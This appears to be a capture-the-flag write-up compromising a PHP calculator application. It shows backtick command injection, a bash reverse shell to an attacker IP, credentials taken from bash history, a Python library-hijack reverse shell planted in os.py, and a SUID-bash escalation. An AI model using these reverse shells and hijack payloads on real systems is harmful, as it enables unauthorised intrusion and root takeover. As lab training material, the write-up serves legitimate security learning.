## Port Scanning

The application is an online calculator.

![calc 1](/static/images/calc-writeup-images/image1.png)

I captured the request with Burp.

![calc 2](/static/images/calc-writeup-images/image2.png)

Testing command injection:

Since this is a PHP application, we can test by passing the famous ‘backticks’, as PHP understands that it should execute whatever is inside ````.

In this case, I passed the `id` in the calc parameter.

## Foot Hold

`bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'`

`crtl+u` to encode in Burp.

## Lateral Movement

`sysadmim` user's credentials found in the bash history.

## Privillege Escalation

`sudo -l`

![calc 8](/static/images/calc-writeup-images/image8.png)

We can execute calc.py as root; however, we do not have write privileges on the script.

![calc 9](/static/images/calc-writeup-images/image9.png)

Looking at the script, we can see that it imports the **os** module from Python, which is responsible for executing system commands.

![calc 10](/static/images/calc-writeup-images/image10.png)

To perform library hijacking, we need permission to modify the **os.py** library, which is located in the directory: **/usr/lib64/python3.7/os.py**.

In this case, we have write permission.

![calc 11](/static/images/calc-writeup-images/image11.png)

With this, we can add a reverse shell in Python inside the library.

Just place the reverse shell on the last line of the file:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.31.150",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

```

![calc 12](/static/images/calc-writeup-images/image12.png)

Finally, just run the command: sudo /usr/bin/python3 /opt/pycalc/calc.py

![calc 13](/static/images/calc-writeup-images/image13.png)

## Privillege Escalation 2 (Unintended)

Looking at the directory where the file belongs, we can verify that we have write permission directly on it.

![calc 14](/static/images/calc-writeup-images/image14.png)

So, we can simply delete the **calc.py** and create another one.

```python
import os

os.system("chmod u+s /bin/bash")
```
